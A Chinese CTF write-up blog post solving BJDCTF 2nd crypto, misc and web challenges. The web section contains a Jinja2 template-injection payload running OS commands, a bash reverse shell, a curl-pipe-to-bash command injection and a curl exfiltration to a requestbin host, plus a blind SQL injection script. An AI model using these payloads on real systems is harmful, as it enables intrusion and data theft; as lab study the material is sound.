<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>BJDCTF 2nd解题记录</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&text=BJDCTF 2nd解题记录" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BJDCTF 2nd解题记录&body=Check out this article: http://yoursite.com/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-签到"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-燕言燕语"><span class="toc-number">1.2.</span> <span class="toc-text">0x 02 燕言燕语</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-Y1nglish"><span class="toc-number">1.3.</span> <span class="toc-text">0x 03 Y1nglish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-老文盲了"><span class="toc-number">1.4.</span> <span class="toc-text">0x 04 老文盲了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-cat-flag"><span class="toc-number">1.5.</span> <span class="toc-text">0x 05 cat_flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-灵能精通"><span class="toc-number">1.6.</span> <span class="toc-text">0x 06 灵能精通</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07-rsa0"><span class="toc-number">1.7.</span> <span class="toc-text">0x 07 rsa0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-08-rsa1"><span class="toc-number">1.8.</span> <span class="toc-text">0x 08 rsa1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Real-EasyBaBa"><span class="toc-number">2.1.</span> <span class="toc-text">0x 01 Real_EasyBaBa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-最简单的misc"><span class="toc-number">2.2.</span> <span class="toc-text">0x 02 最简单的misc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-A-Beautiful-Picture"><span class="toc-number">2.3.</span> <span class="toc-text">0x 03 A_Beautiful_Picture</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-圣火昭昭"><span class="toc-number">2.4.</span> <span class="toc-text">0x 04 圣火昭昭</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-05-TARGZ"><span class="toc-number">2.5.</span> <span class="toc-text">0x 05 TARGZ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-06-Imagin"><span class="toc-number">2.6.</span> <span class="toc-text">0x 06 Imagin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-07-EasyBaBa"><span class="toc-number">2.7.</span> <span class="toc-text">0x 07 EasyBaBa</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-小姐姐"><span class="toc-number">3.</span> <span class="toc-text">0x 08 小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-fake-google"><span class="toc-number">4.1.</span> <span class="toc-text">0x 01 fake google</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-old-hack"><span class="toc-number">4.2.</span> <span class="toc-text">0x 02 old-hack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-03-duangShell"><span class="toc-number">4.3.</span> <span class="toc-text">0x 03 duangShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-简单注入"><span class="toc-number">5.</span> <span class="toc-text">0x 04 简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-假猪套天下第一"><span class="toc-number">6.</span> <span class="toc-text">0x 05 假猪套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-xss之光"><span class="toc-number">7.</span> <span class="toc-text">0x 06 xss之光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-Schrödinger"><span class="toc-number">8.</span> <span class="toc-text">0x 07 Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-elementmaster"><span class="toc-number">9.</span> <span class="toc-text">0x 08 elementmaster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-文件探测"><span class="toc-number">10.</span> <span class="toc-text">0x 09 文件探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-10-EasyAspDotNet"><span class="toc-number">11.</span> <span class="toc-text">0x 10 EasyAspDotNet</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BJDCTF 2nd解题记录
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-21T03:00:28.000Z" itemprop="datePublished">2020-03-21</time>
        
        (Updated: <time datetime="2020-03-24T12:13:17.523Z" itemprop="dateModified">2020-03-24</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/BJDCTF-2nd/" rel="tag">BJDCTF 2nd</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x-01-签到"><a href="#0x-01-签到" class="headerlink" title="0x 01 签到"></a>0x 01 签到</h4><p>base64解码，得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
<h4 id="0x-02-燕言燕语"><a href="#0x-02-燕言燕语" class="headerlink" title="0x 02 燕言燕语"></a>0x 02 燕言燕语</h4><p>十六进制ascii解码得到<code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code>,有秘钥和密文，使用维吉尼亚解密得到flag：<code>BJD{yanzi_jiushige_shabi}</code></p>
<h4 id="0x-03-Y1nglish"><a href="#0x-03-Y1nglish" class="headerlink" title="0x 03 Y1nglish"></a>0x 03 Y1nglish</h4><p>cryptogram，使用<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> 进行词频分析<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
<h4 id="0x-04-老文盲了"><a href="#0x-04-老文盲了" class="headerlink" title="0x 04 老文盲了"></a>0x 04 老文盲了</h4><p>前三个读音谐音是bjd,加上括号得到flag:<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
<h4 id="0x-05-cat-flag"><a href="#0x-05-cat-flag" class="headerlink" title="0x 05 cat_flag"></a>0x 05 cat_flag</h4><p>转二进制0和1，然后转换成ascii码<code>BJD{M!a0~}</code></p>
<h4 id="0x-06-灵能精通"><a href="#0x-06-灵能精通" class="headerlink" title="0x 06 灵能精通"></a>0x 06 灵能精通</h4><p>圣堂武士密码，<code>flag{imknightstemplar}</code></p>
<h4 id="0x-07-rsa0"><a href="#0x-07-rsa0" class="headerlink" title="0x 07 rsa0"></a>0x 07 rsa0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line">#coding:utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">a &#x3D; 19625999955447888696390122377840961046753166968795603958063759044864679839536144670602538259831709040965956732805593396708352122584482022376941163677038630</span><br><span class="line">b &#x3D; -6176456758340029098089723810501754297130222103009042736616635563726055049689190205055246912914622570674537736155897459910194725001900500831842809740927188</span><br><span class="line">p &#x3D; (a+b)&#x2F;&#x2F;2</span><br><span class="line">q &#x3D; a - p</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">e &#x3D; 11599829</span><br><span class="line">phi_n &#x3D; (p-1)*(q-1)</span><br><span class="line">d &#x3D; gmpy2.invert(e, phi_n)</span><br><span class="line">c&#x3D;56321185753972151625933543608447787603473765973133149195380115478652285169342828192188623886133346029943442805825230692586385224853985274428971911119067878344128774137755834569527854261217660651515751605050298584366067378011417778663843804831679164271995792961169460893723530652355646614029892945792281751318</span><br><span class="line"></span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">m_hex &#x3D; hex(m)[2:]</span><br><span class="line">print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</span><br></pre></td></tr></table></figure>

<h4 id="0x-08-rsa1"><a href="#0x-08-rsa1" class="headerlink" title="0x 08 rsa1"></a>0x 08 rsa1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line">#coding:utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">pq2&#x3D;132460282208391991552504764158634319936843554116715219469744299565888922214090496383771423130754188072840177198713136552967515380145051097065304848247872626812877510785478194570333764592747579974257129121686553068266545388629795106936696480440573976108980624756620858768409569815902492696692024566751096101450</span><br><span class="line">p_q&#x3D;-2358553385115093812029178776311290326692733442577350424602482420585435891550592627378204257296268157330536400908927134081281776410533122724646838983965214</span><br><span class="line"></span><br><span class="line">twopq &#x3D; pq2-p_q*p_q</span><br><span class="line">print twopq</span><br><span class="line">paddq &#x3D; gmpy2.iroot(pq2+twopq, 2)[0]</span><br><span class="line">p &#x3D; (p_q + paddq)&#x2F;&#x2F;2</span><br><span class="line">q &#x3D; paddq - p</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">e &#x3D; 14210467</span><br><span class="line">phi_n &#x3D; (p-1)*(q-1)</span><br><span class="line">d &#x3D; gmpy2.invert(e, phi_n)</span><br><span class="line">c&#x3D;54150517220650140028230395502829113080080100957324148844875007477604158600988888413131474639870810651777850996192670627127105245333421193508379548496607689697581005727782733578377221590747840584310825695104670904142592120874252688132880343575146089908272336108371364352105123041459289967694652573340235143783</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">m_hex &#x3D; hex(m)[2:]</span><br><span class="line">print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))</span><br></pre></td></tr></table></figure>

<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-Real-EasyBaBa"><a href="#0x-01-Real-EasyBaBa" class="headerlink" title="0x 01 Real_EasyBaBa"></a>0x 01 Real_EasyBaBa</h4><p>使用十六进制打开，图形化flag：<code>BJD{572154976}</code></p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321111737691.png" alt></p>
<h4 id="0x-02-最简单的misc"><a href="#0x-02-最简单的misc" class="headerlink" title="0x 02 最简单的misc"></a>0x 02 最简单的misc</h4><p>zip伪加密：<code>java -jar ZipCenOp.jar r secret.zip</code></p>
<p>添加png文件头,得到一张图片，图中的字母转16进制ascii得到flag</p>
<p><code>BJD{y1ngzuishuai}</code></p>
<h4 id="0x-03-A-Beautiful-Picture"><a href="#0x-03-A-Beautiful-Picture" class="headerlink" title="0x 03 A_Beautiful_Picture"></a>0x 03 A_Beautiful_Picture</h4><p>高度隐写，<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
<h4 id="0x-04-圣火昭昭"><a href="#0x-04-圣火昭昭" class="headerlink" title="0x 04 圣火昭昭"></a>0x 04 圣火昭昭</h4><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321120107247.png" alt></p>
<p>提示新佛曰，使用<a href="http://hi.pcmoe.net/buddha.html解密，得到gemlovecom" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.html解密，得到gemlovecom</a></p>
<p>根据题目提示猜测是outguess隐写，使用相应打的解密工具解密得到</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321130141007.png" alt></p>
<p>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</p>
<h4 id="0x-05-TARGZ"><a href="#0x-05-TARGZ" class="headerlink" title="0x 05 TARGZ"></a>0x 05 TARGZ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-    </span><br><span class="line">import os</span><br><span class="line">key &#x3D; &quot;&quot;</span><br><span class="line">filename &#x3D; &quot;&quot;</span><br><span class="line">while True:</span><br><span class="line">	datanames &#x3D; os.listdir(&quot;.&#x2F;&quot;)</span><br><span class="line">	for dataname in datanames:</span><br><span class="line">	    if dataname.find(&quot;.tar.gz&quot;)!&#x3D;-1:</span><br><span class="line">		key &#x3D; dataname.replace(&quot;.tar.gz&quot;,&quot;&quot;)</span><br><span class="line">		filename &#x3D; dataname</span><br><span class="line">		uncmd &#x3D; &quot;unzip -q -P &quot; + key + &quot; &quot; + filename</span><br><span class="line">		os.system(uncmd)</span><br><span class="line">		rmcmd &#x3D; &quot;rm -f &quot; + filename</span><br><span class="line">		os.system(rmcmd)</span><br></pre></td></tr></table></figure>

<p>文件名是解压密码，写了一个python脚本一直解压就行了，最后flag是<code>BJD{wow_you_can_rea11y_dance}</code>，赛后看了一下wp可以使用filetype库判断文件类型</p>
<h4 id="0x-06-Imagin"><a href="#0x-06-Imagin" class="headerlink" title="0x 06 Imagin"></a>0x 06 Imagin</h4><p>听力题，参考<a href="https://aidn.jp/mikutap/，flag是`BJD{MIKUTAP3313313}`" target="_blank" rel="noopener">https://aidn.jp/mikutap/，flag是`BJD{MIKUTAP3313313}`</a></p>
<h4 id="0x-07-EasyBaBa"><a href="#0x-07-EasyBaBa" class="headerlink" title="0x 07 EasyBaBa"></a>0x 07 EasyBaBa</h4><p>分离出视频，然后出现几张二维码，修复扫码或者使用QR_Research设置容错率扫码，解出 base16 字符串栅栏后得到<code>BJD{imagin_love_Y1ng}</code></p>
<h3 id="0x-08-小姐姐"><a href="#0x-08-小姐姐" class="headerlink" title="0x 08 小姐姐"></a>0x 08 小姐姐</h3><p>winhex打开搜索BJD字符串，得到flag：<code>BJD{haokanma_xjj}</code></p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-fake-google"><a href="#0x-01-fake-google" class="headerlink" title="0x 01 fake google"></a>0x 01 fake google</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a>  使用tplmap一把梭</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200321211250734.png" alt></p>
<h4 id="0x-02-old-hack"><a href="#0x-02-old-hack" class="headerlink" title="0x 02 old-hack"></a>0x 02 old-hack</h4><p>使用TP-SCan一把梭，发现是5.0.23的RCE</p>
<h4 id="0x-03-duangShell"><a href="#0x-03-duangShell" class="headerlink" title="0x 03 duangShell"></a>0x 03 duangShell</h4><p>访问/.index.php.swp得到源码，用<code>vim -r index.php</code>恢复源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exec()</code>无回显，所以首选反弹shell。先在网站的根目录创建一个shell.txt,写入反弹shell语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>然后在攻击机端执行</p>
<p>girl_friend=curl <a href="http://174.1.83.107/shell.txt|bash" target="_blank" rel="noopener">http://174.1.83.107/shell.txt|bash</a></p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200323234620118.png" alt></p>
<p>发现/flag 是假的，然后利用 find 命令找到 flag，<code>find / -name flag</code></p>
<p>之前晚上flag位置没变的时候可以直接带出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;requestbin.xxx -X POST -d &quot;&#96;head &#x2F;flag&#96;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="0x-04-简单注入"><a href="#0x-04-简单注入" class="headerlink" title="0x 04 简单注入"></a>0x 04 简单注入</h3><p>访问robots.txt，得到hint.txt提示，访问得到后台SQL语句提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure>

<p>根据语句分析可以通过斜杠转义来逃逸单引号，套用<a href="https://www.zhihu.com/people/yoshino-34" target="_blank" rel="noopener">yoshino-s</a>的脚本，exp写的非常整洁美观</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;946de4c6-b1c6-4c0b-be3e-769a8f871538.node3.buuoj.cn&#x2F;index.php&#39;</span><br><span class="line"></span><br><span class="line">def inj(payload):</span><br><span class="line">    req&#x3D;requests.post(url,data&#x3D;&#123;&#39;password&#39;:payload, &#39;username&#39;:&#39;s\\&#39;&#125;)</span><br><span class="line">    if &#39;BJD needs to be stronger&#39; in req.text:</span><br><span class="line">        return True</span><br><span class="line">result&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">db &#x3D; &#39;p3rh4ps&#39;</span><br><span class="line">password&#x3D;&#39;OhyOuFOuNdit&#39;</span><br><span class="line"></span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot; or ascii(substr(password, %d,1))&gt;%d #&quot; % (x, mid)</span><br><span class="line">        # payload &#x3D; &quot; or ascii(substr(username, %d,1))&gt;%d #&quot; % (x, mid)</span><br><span class="line">        print(payload)</span><br><span class="line">        res &#x3D; inj(payload)</span><br><span class="line">        if res:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>得到用户名<code>admin</code>，密码<code>OhyOuFOuNdit</code>,登录得到flag</p>
<p>另外如果使用正则注入需要注意regexp匹配在3.23.4版本后是不分大小写的，要加上<code>binary</code>关键字</p>
<h3 id="0x-05-假猪套天下第一"><a href="#0x-05-假猪套天下第一" class="headerlink" title="0x 05 假猪套天下第一"></a>0x 05 假猪套天下第一</h3><p>1.随便输入账号密码登录抓包发现有302跳转，提示了访问L0g1n.php，告知:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure>

<p>cookie处发现一个叫time的cookie，存放的是当前的时间戳，把他改大改到99年以后即可。</p>
<p>剩下根据提示进行修改：</p>
<p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/E:%5CHexo-Blog%5Csource_posts%5CBUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89%5Cimage-20200324002542942.png" alt="image-20200324002542942"></p>
